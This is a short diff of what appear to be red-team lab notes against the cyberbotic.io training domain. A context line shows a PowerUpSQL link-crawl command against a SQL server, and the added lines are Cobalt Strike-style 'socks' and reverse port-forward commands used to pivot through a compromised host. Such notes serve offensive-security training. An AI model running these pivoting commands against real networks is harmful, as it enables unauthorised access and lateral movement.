@@ -36,5 +36,8 @@ powershelll Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query '
 111
 ```
 
-
+```
+socks 1080
+rportfwd 8080 10.8.0.6 80
+```
 
